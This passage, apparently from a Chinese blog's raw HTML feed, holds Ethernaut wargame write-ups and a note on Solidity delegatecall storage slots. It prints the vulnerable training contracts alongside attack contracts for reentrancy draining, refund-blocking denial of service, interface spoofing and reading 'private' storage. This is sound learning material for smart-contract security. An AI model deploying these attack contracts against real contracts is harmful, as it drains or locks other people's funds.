class="line"></span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;  </span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; prize || msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这是一个类似于拍卖的合约<br>题目的意思其实就是说让我们在成功报价后，想办法让别人无法对你的报价再进行竞拍。因为刚好前两天才系统性的了解了拒绝服务DDOS攻击，这道题就变得很容易。</p><blockquote><p>因为这个竞拍合约需要向上一个竞拍者转账后才能完成竞拍成功（完成king的交换），那我们不让他转账成功不就可以永远不被替换了嘛，需要我们创建一个攻击合约，而此合约需要fallable和receive函数不能设置为payable，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract AttackKing &#123;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _victim) public payable &#123;</span><br><span class="line">        _victim.call.gas(1000000).value(msg.value)(&quot;&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>在此攻击合约中我们不写任何receive fallback函数，那么默认就是没有payable修饰的，自然也就接收不了转账。当然，也可以在receive中用revert()语句去终止交易。</p><ul><li>解题步骤</li></ul><ol><li>先用<code>web3.eth.getStorageAt(&#39;0x2814Cd87DdF364D7A5Ef9BAC507fdad131956647&#39;,1)</code>查看一下当前竞拍值是多少<br><img src="03.png" alt=""><br>在这里可以看到是0.001ether，那么我们就需要提供大于0.001ether的报价才能成为king</li><li>在创建攻击合约时，同时存0.0011个ether进去(如果你测试币多的话直接传1ether就行)<br><img src="02.jpg" alt=""></li><li>通关</li></ol></blockquote><h2 id="10-Re-Entrancy"><a href="#10-Re-Entrancy" class="headerlink" title="10 Re-Entrancy"></a>10 Re-Entrancy</h2><p>顾名思义，这是一个重入漏洞<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;@openzeppelin&#x2F;contracts-ethereum-package&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] &#x3D; balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;&#x3D; _amount) &#123;</span><br><span class="line">      (bool result,) &#x3D; msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -&#x3D; _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以注意到withdraw函数里面很明显是存在重入漏洞的，（在更改全局变量之前进行了外部调用）于是我们利用这个漏洞写出攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line"></span><br><span class="line">    address payable target;</span><br><span class="line">    uint amount &#x3D; 1000000000000000 wei;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _addr) public payable &#123;</span><br><span class="line">        target&#x3D;_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step1() public payable&#123;</span><br><span class="line">        target.call&#123;value: amount&#125;(abi.encodeWithSignature(&quot;donate(address)&quot;,address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setp2() public payable &#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;withdraw(uint256)&quot;,amount));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fallback () external payable&#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;withdraw(uint256)&quot;,amount));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>注意第一步第二步最好分开写，否则可能造成交易超过gas limit的上限导致执行失败</p><ul><li>解题步骤<br>按照step1，2执行即可<br><img src="../images/ethernaut/e10/01.png" alt=""><br>可以看到原合约已经没有token了。而我们的账户有了很多，攻击成功。<br><img src="../images/ethernaut/e10/02.png" alt=""></li></ul><h1 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11 Elevator"></a>11 Elevator</h1><p>这道题其实考的是编程时的一个逻辑漏洞<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building &#x3D; Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor &#x3D; _floor;</span><br><span class="line">      top &#x3D; building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目想要我们到达顶层，也就是把<code>top</code>变为true，但是我们明显能看到想要进入<code>goTo(uint)</code>中的判断条件，<code>building.isLastFloor(_floor)</code>就必须是<code>false</code>，<code>top</code>也等于这个值，乍一看想要<code>top=true</code>好像是个不可能的事。但由于<code>Building</code>是个接口，而<code>isLastFloor</code>则是一个抽象函数，这里<code>Building(msg.sender)</code>远程调用我们传入的合约，因此我们可以自己设计这个函数的具体内容。</p><blockquote><p>其实在这里两次调用了<code>building.isLastFloor(floor)</code>，他们的返回值一定是一样的吗？既然我们可以自定义函数，我们就可以在函数里面做一些变动让判断条件在第二次调用时，返回相反的值。</p></blockquote><p>攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Elevator &#123;</span><br><span class="line">  function goTo(uint _floor) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyBuilding&#123;</span><br><span class="line">    uint temp &#x3D; 5;</span><br><span class="line">    Elevator e;</span><br><span class="line">    function isLastFloor(uint i) external returns (bool)&#123;</span><br><span class="line">        if(temp &#x3D;&#x3D; i)&#123;</span><br><span class="line">            temp &#x3D; 6;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function dosome() public&#123;</span><br><span class="line">        address adr &#x3D; 0xd8b4056b73Cd9E7890a32548cEAd96D6116B52ae;&#x2F;&#x2F;Elevator地址</span><br><span class="line">        e &#x3D; Elevator(adr);</span><br><span class="line">        &#x2F;&#x2F; adr.call(abi.encodeWithSignature(&quot;goTo(uint256)&quot;,5));</span><br><span class="line">        e.goTo(5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，在第一次调用之后我就把temp的值变了，那么第二次再进行判断时，就会返回true。</p><ul><li>解题步骤<br>执行dosome()即可</li></ul><h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12 Privacy"></a>12 Privacy</h2><p>这个题和前面08 Vault几乎一样，实质就是告诉我们以太坊中的储存，就算是private修饰，他也是可以被访问到的，比如用web3脚本<br><code>web3.eth.getStorageAt()</code>就可以轻松访问到。<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked &#x3D; true;</span><br><span class="line">  uint256 public ID &#x3D; block.timestamp;</span><br><span class="line">  uint8 private flattening &#x3D; 10;</span><br><span class="line">  uint8 private denomination &#x3D; 255;</span><br><span class="line">  uint16 private awkwardness &#x3D; uint16(now);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) public &#123;</span><br><span class="line">    data &#x3D; _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key &#x3D;&#x3D; bytes16(data[2]));</span><br><span class="line">    locked &#x3D; false;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们只要获得key就可以通关，也就是合约中的<code>data</code>,<br>直接获取即可。</p><ul><li>解题步骤<ol><li>用<code>web3.eth.getStorageAt(&#39;0xe1442525366a0cC8e2D25E480B0ACf47FE291Ecc&#39;,5)</code>得到data<br><img src="04.png" alt=""></li><li>然后由于require中的判断是去前16个byte，去前32位执行unlock方法即可<br><img src="05.png" alt=""></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Delegatecall</title>
      <link href="/delegatecall/"/>
      <url>/delegatecall/</url>
      
        <content type="html"><![CDATA[<h1 id="Solidity之DelegateCall"><a href="#Solidity之DelegateCall" class="headerlink" title="Solidity之DelegateCall"></a>Solidity之DelegateCall</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>在Solidity中，如果只是为了代码复用，我们会把公共代码抽出来，部署到一个library中，后面就可以像调用C库、Java库一样使用了。但是library中不允许定义任何storage类型的变量，这就意味着library不能修改合约的状态。如果需要修改合约状态，我们需要部署一个新的合约，这就涉及到合约调用合约的情况。</p><h2 id="三种调用函数"><a href="#三种调用函数" class="headerlink" title="三种调用函数"></a>三种调用函数</h2><p>  在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式。<br/></p><p>  他们的异同点如下：</p><ul><li><strong>call</strong>: 调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境</li><li><strong>delegatecall</strong>: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）</li><li><p><strong>callcode</strong>: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境</p><blockquote><p>注意：”callcode”已被弃用，取而代之的是” delegatcall “</p></blockquote></li><li><p><strong>CALL vs. CALLCODE</strong></p><blockquote><p>CALL和CALLCODE的区别在于：代码执行的上下文环境不同。</p></blockquote><p>具体来说，CALL修改的是被调用者的storage，而CALLCODE修改的是调用者的storage。<br><img src="Delegatecall01.png" alt=""></p></li><li><p><strong>CALLCODE vs. DELEGATECALL</strong><br>可以认为<code>DELEGATECALL</code>是<code>CALLCODE</code>的一个bugfix版本，官方已经不建议使用<code>CALLCODE</code>了。<br/></p><blockquote><p>CALLCODE和DELEGATECALL的区别在于：msg.sender不同。</p></blockquote><p>具体来说，DELEGATECALL会一直使用原始调用者的地址，而CALLCODE不会。<br><img src="Delegatecall02.png" alt=""></p></li></ul><h1 id="delegatecall的细节问题"><a href="#delegatecall的细节问题" class="headerlink" title="delegatecall的细节问题"></a>delegatecall的细节问题</h1><p>  先来看一段代码：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract calltest &#123;</span><br><span class="line">  address public c;</span><br><span class="line">  address public b;</span><br><span class="line"> </span><br><span class="line">  function test() public returns (address a)&#123;</span><br><span class="line">      a&#x3D;address(this);</span><br><span class="line">      b&#x3D;a;</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract compare &#123;</span><br><span class="line">    address public b;</span><br><span class="line">    address public c;</span><br><span class="line">    address testaddress &#x3D; address of calltest;</span><br><span class="line">    function withdelegatecall()&#123;</span><br><span class="line">        testaddress.delegatecall(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>  看起来似乎没什么问题，但是两个合约的b与c向量的位置不同，我们来看一下执行的结果.<br>  b没有被赋值，反而是c被赋值了。<br>  在这里我们要关注一个EVM层面的问题，<strong>如何保存字段变量到存储</strong></p><p>  简单来说，EVM为字段变量分配槽号（slot number），第一个被申明的占0号槽位，以此类推。</p><blockquote><p>在EVM中，它在智能合约存储中有2^256个插槽，每个插槽可以保存32字节大小的数据。 </p></blockquote><p>  <br/><br>  我们知道使用delegatecall时代码执行的上下文是当前的合约，这代表使用的存储也是当前合约，当然这里指的是storage存储，然而我们要执行的是在目标合约那里的opcode，当我们的操作涉及到了storage变量时，其对应的访存指令其实是硬编码在我们的操作指令当中的，而EVM中访问storage存储的依据就是这些变量的存储位，对于上面的合约我们执行的汇编代码为sload——即访存指令，给定的即访问一号存储位，在我们的主合约中即对应变量c，在calltest合约中则对应于变量b，所以事实上调用delegatecall来使用storage变量时其实依据并不是变量名而是变量的存储位，这样的话我们就可以达到覆盖相关变量的目的</p><p>  参考：<br>  <a href="https://blog.csdn.net/Fly_hps/article/details/81218219" target="_blank" rel="noopener">delegatecall杂谈</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ethernaut 题解 01-06</title>
      <link href="/2022-11-03-ethernaut01/"/>
      <url>/2022-11-03-ethernaut01/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut靶场刷题记录-1-6"><a href="#Ethernaut靶场刷题记录-1-6" class="headerlink" title="Ethernaut靶场刷题记录(1-6)"></a>Ethernaut靶场刷题记录(1-6)</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="01-FallBack"><a href="#01-FallBack" class="headerlink" title="01 FallBack"></a>01 FallBack</h2><p>这道题是比较简单的，合约的逻辑有问题导致出现漏洞<br/><br>我们先来了解一下receive和fallback的区别：</p><blockquote><p><strong>receive():</strong><br>    一个合约只能有一个receive函数，该函数不能有参数和返回值，需设置为external，payable；<br><strong>fallback():</strong><br>    一个合约只能有一个receive函数，该函数不能有参数和返回值，需设置为external；<br>    可设置为payable；</p></blockquote><p>当本合约的其他函数不匹配调用，或调用者未提供任何信息，且没有receive函数，fallback函数被触发；<br>当本合约收到ether但并未被调用任何函数，未接受任何数据，receive函数被触发；</p><p>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address &#x3D;&gt; uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    contributions[msg.sender] &#x3D; 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目中给到的SafeMath的地址已经获取不到了，我直接选择找了老版本的SafeMath源码在我本地拉取下来。或者也可以直接用<code>import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;</code>路径代替。<br/></p><p>题目想要我们获得合约的所有权，<code>owner</code>再使用<code>withdraw</code>提取出来</p><ul><li><p>解题思路<br>  阅读完源码发现此合约的<code>receive</code>函数是有明显漏洞的，我们只需要向此函数转发出一笔转账交易即可将<code>owner</code>的所有权改为自己</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  当然，为了达成<code>receive</code>中的require限制条件，我们还需要执行一次<code>contribute()</code>来将我们的<code>contributions[msg.sender] &gt; 0</code><br/><br>  在获得<code>owner</code>后，执行<code>withdraw()</code>即可通关。</p></li><li><p>解题步骤</p><ol><li>在控制台中调用<code>contract.contribute({value:1)</code>在不带单位的情况下默认单位为<code>wei</code><br><img src="01.png" alt=""></li><li>可以使用<code>contract.address</code>命令查看合约地址，然后使用metamask给合约地址转一笔账<br><img src="02_1.png" alt=""><br><img src="02_2.png" alt=""></li><li>此时<code>owner</code>应该已经到了，我们来看一下：<br><img src="03.png" alt=""></li><li>执行<code>withdraw()</code>函数进行提款<br><img src="04.png" alt=""></li><li>通关<br><img src="05.png" alt=""></li></ol></li></ul><h2 id="02-Fallout"><a href="#02-Fallout" class="headerlink" title="02 Fallout"></a>02 Fallout</h2><p>  emmm很白痴的关卡<br>  先看代码</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#x2F;* constructor *&#x2F;</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    allocations[owner] &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">          require(</span><br><span class="line">              msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">              &quot;caller is not the owner&quot;</span><br><span class="line">          );</span><br><span class="line">          _;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] &#x3D; allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  题目要求获得合约的所有权。<br>  我看了这个合约很久，一直没找到可以攻击的地方……直到我看到了<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* constructor *&#x2F;</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    allocations[owner] &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>  仔细看这个构造函数的名字，我们会发现<code>Fal1out</code>中间居然有个<code>1</code>关键是他还在上面注释了<code>constructor</code>就很坑。<br/><br>  那既然它不是个构造函数，并且具有构造函数的功能，那我们直接调用这个错误的“构造函数”就可以获得合约的所有权了。</p><blockquote><p>构造函数最好用<code>constructor() public {……}</code>的写法</p><ul><li>解题步骤<ol><li>调用<code>fal1out</code>函数<br><img src="06.png" alt=""></li><li>可以看到此时我们已经获得了合约的所有权<br><img src="07.png" alt=""></li><li>通关<br><img src="suc.png" alt=""></li></ol></li></ul></blockquote><h2 id="03-Coin-Flip"><a href="#03-Coin-Flip" class="headerlink" title="03 Coin Flip"></a>03 Coin Flip</h2><p>这是一个和区块结构有关的漏洞，由于用<code>blockhash(block.number.sub(1))</code>的方式计算上一区块的哈希的方式是极容易被攻击利用的。<br/><br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    consecutiveWins &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue &#x3D; uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash &#x3D;&#x3D; blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash &#x3D; blockValue;</span><br><span class="line">    uint256 coinFlip &#x3D; blockValue.div(FACTOR);</span><br><span class="line">    bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side &#x3D;&#x3D; _guess) &#123;</span><br><span 